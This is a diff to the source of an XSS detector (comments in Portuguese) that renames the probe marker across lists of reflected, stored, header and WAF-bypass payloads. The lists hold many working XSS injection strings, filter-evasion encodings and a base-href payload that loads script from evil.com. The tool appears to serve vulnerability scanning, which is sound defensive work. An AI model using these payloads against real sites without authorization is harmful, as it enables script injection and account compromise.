@@ -290,96 +290,96 @@ class XSSDetector:
       4. header     — injeta o marker em headers HTTP refletidos
     """
 
-    _MARKER = "DEXSS7x"
+    _MARKER = "MPXSS7x"
 
     # ── Reflected payloads ────────────────────────────────────────────────────
     _REFLECTED_PAYLOADS: List[str] = [
-        "<script>alert('DEXSS7x')</script>",
-        '"><script>alert("DEXSS7x")</script>',
-        "'><script>alert('DEXSS7x')</script>",
-        "<script>alert`DEXSS7x`</script>",
-        "<script type='text/javascript'>alert('DEXSS7x')</script>",
-        '<img src=x onerror=alert("DEXSS7x")>',
-        '"><img src=x onerror=alert("DEXSS7x")>',
-        "<video src=x onerror=alert('DEXSS7x')>",
-        "<audio src=x onerror=alert('DEXSS7x')>",
-        "<source src=x onerror=alert('DEXSS7x')>",
-        "<svg/onload=alert('DEXSS7x')>",
-        '"><svg onload=alert("DEXSS7x")>',
-        "<svg><script>alert('DEXSS7x')</script></svg>",
-        "<svg><animate onbegin=alert('DEXSS7x') attributeName=x dur=1s>",
-        "<math><mtext></mtext><script>alert('DEXSS7x')</script></math>",
-        "<input autofocus onfocus=alert('DEXSS7x')>",
-        "<select autofocus onfocus=alert('DEXSS7x')>",
-        "<textarea autofocus onfocus=alert('DEXSS7x')>",
-        "<details open ontoggle=alert('DEXSS7x')>",
-        '<body onload=alert("DEXSS7x")>',
-        '<iframe srcdoc="<script>alert(\'DEXSS7x\')</script>">',
-        "<form><button formaction=javascript:alert('DEXSS7x')>X</button></form>",
-        '" onmouseover="alert(\'DEXSS7x\')" x="',
-        "' onmouseover='alert(\"DEXSS7x\")' x='",
-        '" onfocus="alert(\'DEXSS7x\')" autofocus="',
-        "<a href=javascript:alert('DEXSS7x')>click</a>",
-        "';alert('DEXSS7x')//",
-        '";alert("DEXSS7x")//',
-        "`<script>alert('DEXSS7x')</script>`",
-        "${alert('DEXSS7x')}",
-        "{{constructor.constructor('alert(\"DEXSS7x\")')()}}",
-        "#{alert('DEXSS7x')}",
-        "<noscript><p title=\"</noscript><img src=x onerror=alert('DEXSS7x')\">",
-        "<listing><img src=\"</listing><img src=x onerror=alert('DEXSS7x')\">",
-        "<link rel=stylesheet href=javascript:alert('DEXSS7x')>",
+        "<script>alert('MPXSS7x')</script>",
+        '"><script>alert("MPXSS7x")</script>',
+        "'><script>alert('MPXSS7x')</script>",
+        "<script>alert`MPXSS7x`</script>",
+        "<script type='text/javascript'>alert('MPXSS7x')</script>",
+        '<img src=x onerror=alert("MPXSS7x")>',
+        '"><img src=x onerror=alert("MPXSS7x")>',
+        "<video src=x onerror=alert('MPXSS7x')>",
+        "<audio src=x onerror=alert('MPXSS7x')>",
+        "<source src=x onerror=alert('MPXSS7x')>",
+        "<svg/onload=alert('MPXSS7x')>",
+        '"><svg onload=alert("MPXSS7x")>',
+        "<svg><script>alert('MPXSS7x')</script></svg>",
+        "<svg><animate onbegin=alert('MPXSS7x') attributeName=x dur=1s>",
+        "<math><mtext></mtext><script>alert('MPXSS7x')</script></math>",
+        "<input autofocus onfocus=alert('MPXSS7x')>",
+        "<select autofocus onfocus=alert('MPXSS7x')>",
+        "<textarea autofocus onfocus=alert('MPXSS7x')>",
+        "<details open ontoggle=alert('MPXSS7x')>",
+        '<body onload=alert("MPXSS7x")>',
+        '<iframe srcdoc="<script>alert(\'MPXSS7x\')</script>">',
+        "<form><button formaction=javascript:alert('MPXSS7x')>X</button></form>",
+        '" onmouseover="alert(\'MPXSS7x\')" x="',
+        "' onmouseover='alert(\"MPXSS7x\")' x='",
+        '" onfocus="alert(\'MPXSS7x\')" autofocus="',
+        "<a href=javascript:alert('MPXSS7x')>click</a>",
+        "';alert('MPXSS7x')//",
+        '";alert("MPXSS7x")//',
+        "`<script>alert('MPXSS7x')</script>`",
+        "${alert('MPXSS7x')}",
+        "{{constructor.constructor('alert(\"MPXSS7x\")')()}}",
+        "#{alert('MPXSS7x')}",
+        "<noscript><p title=\"</noscript><img src=x onerror=alert('MPXSS7x')\">",
+        "<listing><img src=\"</listing><img src=x onerror=alert('MPXSS7x')\">",
+        "<link rel=stylesheet href=javascript:alert('MPXSS7x')>",
         (
-            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('DEXSS7x') )//"
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('MPXSS7x') )//"
             "%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>"
-            "\\x3csVg/<sVg/oNloAd=alert('DEXSS7x')//\\x3e"
+            "\\x3csVg/<sVg/oNloAd=alert('MPXSS7x')//\\x3e"
         ),
-        "<script>Object.prototype.x=alert('DEXSS7x')</script>",
-        "<noscript><img src=x onerror=alert('DEXSS7x')></noscript>",
+        "<script>Object.prototype.x=alert('MPXSS7x')</script>",
+        "<noscript><img src=x onerror=alert('MPXSS7x')></noscript>",
         "<base href=//evil.com/><script src=/x.js></script>",
-        "<meta http-equiv=refresh content='0;url=javascript:alert(\"DEXSS7x\")'>",
-        "<object data=javascript:alert('DEXSS7x')>",
-        "<embed src=javascript:alert('DEXSS7x')>",
-        "<div tabindex=1 onfocus=alert('DEXSS7x') id=x></div><script>x.focus()</script>",
+        "<meta http-equiv=refresh content='0;url=javascript:alert(\"MPXSS7x\")'>",
+        "<object data=javascript:alert('MPXSS7x')>",
+        "<embed src=javascript:alert('MPXSS7x')>",
+        "<div tabindex=1 onfocus=alert('MPXSS7x') id=x></div><script>x.focus()</script>",
         '<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;" sandbox="allow-scripts">',
     ]
 
     # ── WAF-bypass encoding variants ──────────────────────────────────────────
     _BYPASS_PAYLOADS: List[str] = [
-        "<ScRiPt>alert('DEXSS7x')</sCrIpT>",
-        "<iMg src=x oNeRrOr=alert('DEXSS7x')>",
-        "<svg/onload=&#97;lert('DEXSS7x')>",
-        "&#60;script&#62;alert('DEXSS7x')&#60;/script&#62;",
-        "\\u003Cscript\\u003Ealert('DEXSS7x')\\u003C/script\\u003E",
-        "%3Cscript%3Ealert('DEXSS7x')%3C/script%3E",
-        "%3Cimg+src%3Dx+onerror%3Dalert('DEXSS7x')%3E",
-        "%253Cscript%253Ealert('DEXSS7x')%253C/script%253E",
-        "<scr<!---->ipt>alert('DEXSS7x')</scr<!---->ipt>",
-        "<img src=x o/**/nerror=alert('DEXSS7x')>",
-        "<img\tsrc=x\tonerror=alert('DEXSS7x')>",
-        "<img\nsrc=x\nonerror=alert('DEXSS7x')>",
-        "<img src=`x` onerror=`alert('DEXSS7x')`>",
-        "<iframe src=\"data:text/html,<script>alert('DEXSS7x')</script>\">",
-        "<svg><image href=\"data:,\" onerror=alert('DEXSS7x')>",
-        "<div style=\"width:expression(alert('DEXSS7x'))\">",
-        "<scr\x00ipt>alert('DEXSS7x')</scr\x00ipt>",
-        "<img\x00src=x onerror=alert('DEXSS7x')>",
-        "<script>void(alert('DEXSS7x'))</script>",
-        "<img src=x onerror=void(alert('DEXSS7x'))>",
-        "<svg xmlns='http://www.w3.org/2000/svg' onload=alert('DEXSS7x')/>",
-        "<form action=javascript:alert('DEXSS7x')><button>X</button></form>",
-        "<input type=image src=x onerror=alert('DEXSS7x')>",
-        "<!--<script>alert('DEXSS7x')</script>-->",
+        "<ScRiPt>alert('MPXSS7x')</sCrIpT>",
+        "<iMg src=x oNeRrOr=alert('MPXSS7x')>",
+        "<svg/onload=&#97;lert('MPXSS7x')>",
+        "&#60;script&#62;alert('MPXSS7x')&#60;/script&#62;",
+        "\\u003Cscript\\u003Ealert('MPXSS7x')\\u003C/script\\u003E",
+        "%3Cscript%3Ealert('MPXSS7x')%3C/script%3E",
+        "%3Cimg+src%3Dx+onerror%3Dalert('MPXSS7x')%3E",
+        "%253Cscript%253Ealert('MPXSS7x')%253C/script%253E",
+        "<scr<!---->ipt>alert('MPXSS7x')</scr<!---->ipt>",
+        "<img src=x o/**/nerror=alert('MPXSS7x')>",
+        "<img\tsrc=x\tonerror=alert('MPXSS7x')>",
+        "<img\nsrc=x\nonerror=alert('MPXSS7x')>",
+        "<img src=`x` onerror=`alert('MPXSS7x')`>",
+        "<iframe src=\"data:text/html,<script>alert('MPXSS7x')</script>\">",
+        "<svg><image href=\"data:,\" onerror=alert('MPXSS7x')>",
+        "<div style=\"width:expression(alert('MPXSS7x'))\">",
+        "<scr\x00ipt>alert('MPXSS7x')</scr\x00ipt>",
+        "<img\x00src=x onerror=alert('MPXSS7x')>",
+        "<script>void(alert('MPXSS7x'))</script>",
+        "<img src=x onerror=void(alert('MPXSS7x'))>",
+        "<svg xmlns='http://www.w3.org/2000/svg' onload=alert('MPXSS7x')/>",
+        "<form action=javascript:alert('MPXSS7x')><button>X</button></form>",
+        "<input type=image src=x onerror=alert('MPXSS7x')>",
+        "<!--<script>alert('MPXSS7x')</script>-->",
         "/%2F..%2F..%2Fevil.js",
         '<script charset="x-mac-farsi">\xd0)</script>',
     ]
 
     _STORED_PAYLOADS: List[str] = [
-        "<script>alert('DEXSS7x')</script>",
-        '<img src=x onerror=alert("DEXSS7x")>',
-        "<svg/onload=alert('DEXSS7x')>",
-        "<input autofocus onfocus=alert('DEXSS7x')>",
-        "<details open ontoggle=alert('DEXSS7x')>",
+        "<script>alert('MPXSS7x')</script>",
+        '<img src=x onerror=alert("MPXSS7x")>',
+        "<svg/onload=alert('MPXSS7x')>",
+        "<input autofocus onfocus=alert('MPXSS7x')>",
+        "<details open ontoggle=alert('MPXSS7x')>",
     ]
 
     # ── DOM sources ───────────────────────────────────────────────────────────
@@ -547,14 +547,14 @@ class XSSDetector:
         "X-Original-URL",
     ]
 
-    # [FIX-7] Removidos probes de texto puro ('DEXSS7x', "DEXSS7x", DEXSS7x<br>,
+    # [FIX-7] Removidos probes de texto puro ('MPXSS7x', "MPXSS7x", MPXSS7x<br>,
     # javascript:alert(...)) que não são estruturas HTML executáveis.
     # Reflexão de texto puro NÃO é XSS independente de onde aparece.
     _HEADER_PAYLOADS: List[str] = [
-        "<script>alert('DEXSS7x')</script>",
-        "<img src=x onerror=alert('DEXSS7x')>",
-        "<svg/onload=alert('DEXSS7x')>",
-        '"><img src=x onerror=alert("DEXSS7x")>',
+        "<script>alert('MPXSS7x')</script>",
+        "<img src=x onerror=alert('MPXSS7x')>",
+        "<svg/onload=alert('MPXSS7x')>",
+        '"><img src=x onerror=alert("MPXSS7x")>',
     ]
 
     _MAX_EXTERNAL_SCRIPT_BYTES: int = 512_000
@@ -1395,7 +1395,7 @@ class XSSDetector:
         Injeta o marker XSS em headers da request HTTP.
 
         [FIX-7] _HEADER_PAYLOADS agora contém apenas payloads HTML estruturais.
-        Probes de texto puro ('DEXSS7x', "DEXSS7x", DEXSS7x<br>) foram removidos
+        Probes de texto puro ('MPXSS7x', "MPXSS7x", MPXSS7x<br>) foram removidos
         porque reflexão de texto não é XSS.
 
         [FIX-8] Depois que _is_reflected_unescaped passa, _payload_structure_present
